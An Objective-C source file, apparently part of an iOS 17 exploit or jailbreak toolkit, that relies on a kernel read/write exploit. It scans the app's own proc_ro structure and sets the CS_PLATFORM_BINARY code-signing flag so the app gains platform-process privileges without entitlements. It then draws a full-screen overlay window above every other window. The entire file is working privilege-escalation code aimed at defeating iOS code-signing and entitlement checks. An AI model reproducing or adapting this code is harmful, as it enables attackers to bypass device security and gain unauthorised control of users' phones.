//
//  PlatformPatch.m — self-platformize + overlay via kernel rw
//
//  CS_PLATFORM_BINARY bit on proc_ro.csflags makes the kernel treat us as a
//  platform (system) process. Once set, private UIKit/SpringBoard APIs work
//  without entitlement. This does NOT touch ucred/cred (avoids SMR panic).
//
//  iOS 17.x A14: proc_ro.csflags offset is stable at 0x18+... but we scan
//  proc_ro for the value that looks like csflags (has CS_DEBUGGED|CS_SIGNED
//  bits). Robust against per-build shifts.
//
#import "PlatformPatch.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// xnu csflags
#define CS_VALID             0x0000001
#define CS_ADHOC             0x0000002
#define CS_GET_TASK_ALLOW    0x0000004
#define CS_INSTALLER         0x0000008
#define CS_HARD              0x0000100
#define CS_KILL              0x0000200
#define CS_CHECK_EXPIRATION  0x0000400
#define CS_RESTRICT          0x0000800
#define CS_ENFORCEMENT       0x0001000
#define CS_REQUIRE_LV        0x0002000
#define CS_ENTITLEMENTS_VALIDATED 0x0004000
#define CS_PLATFORM_BINARY   0x0400000
#define CS_DEBUGGED          0x0800000
#define CS_SIGNED            (CS_ADHOC | CS_GET_TASK_ALLOW | CS_INSTALLER | CS_HARD | CS_KILL | CS_CHECK_EXPIRATION | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV | CS_ENTITLEMENTS_VALIDATED)

// iOS 17 A14: proc_ro.p_csflags offset
// In xnu, proc_ro has: pr_task(0x8), p_ucred(0x20)... csflags varies.
// We SCAN proc_ro for a field with value having CS_SIGNED bits set, then OR
// in CS_PLATFORM_BINARY. This is offset-agnostic.
#define SCAN_START 0x28
#define SCAN_END   0x80

static bool g_patched = false;

static uint64_t self_proc_ro(void) {
    uint64_t proc = proc_self();
    if (!proc) return 0;
    uint64_t proc_ro_raw = kread64(proc + 0x18); // off_proc_p_proc_ro
    uint64_t proc_ro = proc_ro_raw & 0x0FFFFFFFFFFFFFFFULL; // strip PAC
    if ((proc_ro & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
        return 0;
    return proc_ro;
}

int platform_patch_self(void) {
    if (g_patched) return 0;
    if (!g_kexploit_ready) return -1;

    uint64_t proc_ro = self_proc_ro();
    if (!proc_ro) {
        NSLog(@"[PlatPatch] proc_ro not found");
        return -1;
    }

    // Find csflags: field with CS_SIGNED bits set (and not a pointer)
    for (uint32_t off = SCAN_START; off <= SCAN_END; off += 0x4) {
        uint32_t val = kread32(proc_ro + off);
        // csflags has CS_SIGNED low bits and is a small int (not kernel ptr)
        if ((val & CS_SIGNED) == CS_SIGNED &&
            (val & 0x80000000) == 0 &&
            (val & 0x000F0000) == 0) {
            uint32_t newVal = val | CS_PLATFORM_BINARY;
            kwrite32(proc_ro + off, newVal);
            uint32_t chk = kread32(proc_ro + off);
            if (chk & CS_PLATFORM_BINARY) {
                NSLog(@"[PlatPatch] csflags @ proc_ro+0x%x: 0x%x -> 0x%x (PLATFORM!)", off, val, chk);
                g_patched = true;
                return 0;
            }
        }
    }
    NSLog(@"[PlatPatch] csflags not found in proc_ro scan");
    return -1;
}

static UIWindow *g_ovWindow = nil;

int platform_overlay_start(void) {
    if (g_ovWindow) return 0;
    if (!g_patched) {
        if (platform_patch_self() != 0) return -1;
    }

    dispatch_async(dispatch_get_main_queue(), ^{
        if (g_ovWindow) return;
        UIWindow *w = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
        w.windowLevel = 10000000.0f; // above all normal windows
        w.hidden = NO;
        w.userInteractionEnabled = NO; // passthrough
        w.backgroundColor = [UIColor colorWithRed:1 green:0 blue:0 alpha:0.3f]; // visible test
        [w makeKeyAndVisible];
        g_ovWindow = w;
        NSLog(@"[PlatPatch] Overlay window shown (red tint)");
    });
    return 0;
}
